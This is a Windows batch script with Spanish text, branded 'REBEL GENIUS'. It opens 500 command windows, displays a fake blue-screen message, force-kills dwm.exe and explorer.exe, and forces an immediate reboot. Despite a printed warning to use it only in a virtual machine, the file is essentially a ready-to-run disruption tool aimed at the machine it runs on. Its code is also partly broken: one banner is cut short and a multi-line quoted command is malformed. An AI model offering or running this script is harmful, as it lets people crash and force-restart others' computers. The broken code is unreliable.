@echo off
title [REBEL GENIUS] - 500 TERMINALES + BSOD EN LA 500
color 0C
mode con: cols=50 lines=15

:: --- ENCABEZADO DE MIERDA ---
echo  ██████╗ ██████╗ ██████╗ ███████╗███████╗██████╗ ██╗   ██╗███████╗
echo ██╔════╝ ██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝
echo ██║  ███╗██████╔╝██████╔╝█████╗  █████╗  ██████╔╝██║   ██║███████╗
echo ██║   ██║██╔══██╗██╔══██╗██╔══╝  ██╔══╝  ██╔══██╗██║   ██║╚════██║
echo ╚██████╔╝██║  ██║██║  ██║███████╗███████╗██║  ██║╚██████╔╝███████║
echo  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
echo.
echo  ███████╗██╗   ██╗███╗   ███╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
echo  ██╔════╝╚██╗ ██╔╝████╗ ████║██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
echo  █████╗   ╚████╔╝ ██╔████╔██║██║        ██║   ██║██║   ██║██╔██╗ ██║
echo  ██╔══╝    ╚██╔╝  ██║╚██╔╝██║██║        ██║   ██║██║   ██║██║╚██╗██║
echo  ███████╗   ██║   ██║ ╚═╝ ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
echo  ╚══════╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
echo.
echo  ██████╗ ███████╗████████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
echo ██╔════╝ ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
echo ██║  ███╗█████╗     ██║   █████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
:: --- FIN DEL ENCABEZADO DE MIERDA ---

:: --- MENSAJE DE ADVERTENCIA ---
echo [⚠️] ¡ADVERTENCIA! ESTE SCRIPT ABRIRÁ 500 TERMINALES Y CAUSARÁ UNA PANTALLA AZUL.
echo [⚠️] SOLO EJECUTAR EN UN ENTORNO CONTROLADO (MÁQUINA VIRTUAL).
echo [⚠️] NO USAR EN SISTEMAS AJENOS SIN PERMISO (ILEGAL).
echo.
pause >nul

:: --- FUNCIÓN PARA ABRIR TERMINALES ---
:open_terminals
setlocal enabledelayedexpansion

:: --- ABRIR 500 TERMINALES INSTANTÁNEAMENTE ---
echo [+] Abriendo 500 terminales...
for /L %%i in (1,1,500) do (
    start cmd /k "echo Terminal %%i/500 - REBEL GENIUS CONTROL && title Terminal %%i/500"
    timeout /t 0 >nul 2>&1
)

:: --- ESPERAR A QUE SE ABRAN TODAS ---
echo [+] Esperando a que se abran todas las terminales...
timeout /t 3 >nul

:: --- PANTALLA AZUL EN LA TERMINAL 500 ---
echo [+] Generando pantalla azul en la terminal 500...
for /L %%i in (1,1,500) do (
    if %%i equ 500 (
        start cmd /k "echo ╔═══════════════════════════════════════════════════════════╗
        echo ║                    PANTALLA AZUL DE LA MUERTE              ║
        echo ║                                                             ║
        echo ║  ███████╗██╗   ██╗███╗   ███╗ ██████╗████████╗██╗ ██████╗    ║
        echo ║  ██╔════╝╚██╗ ██╔╝████╗ ████║██╔════╝╚══██╔══╝██║██╔═══██╗   ║
        echo ║  █████╗   ╚████╔╝ ██╔████╔██║██║        ██║   ██║██║   ██║   ║
        echo ║  ██╔══╝    ╚██╔╝  ██║╚██╔╝██║██║        ██║   ██║██║   ██║   ║
        echo ║  ███████╗   ██║   ██║ ╚═╝ ██║╚██████╗   ██║   ██║╚██████╔╝   ║
        echo ║  ╚══════╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝    ║
        echo ║                                                             ║
        echo ║  ERROR: SYSTEM_SERVICE_EXCEPTION (0x0000003B)              ║
        echo ║  CAUSA: REBEL GENIUS HA DETECTADO ACTIVIDAD MALICIOSA       ║
        echo ║  SOLUCIÓN: REINICIAR EL SISTEMA Y ESPERAR A QUE DIOS LO     ║
        echo ║             ARREGLE (O NO)                                  ║
        echo ╚═══════════════════════════════════════════════════════════╝
        timeout /t 5 >nul
        taskkill /f /im dwm.exe >nul 2>&1
        taskkill /f /im explorer.exe >nul 2>&1
        shutdown /r /t 0 /f
    )
)

endlocal
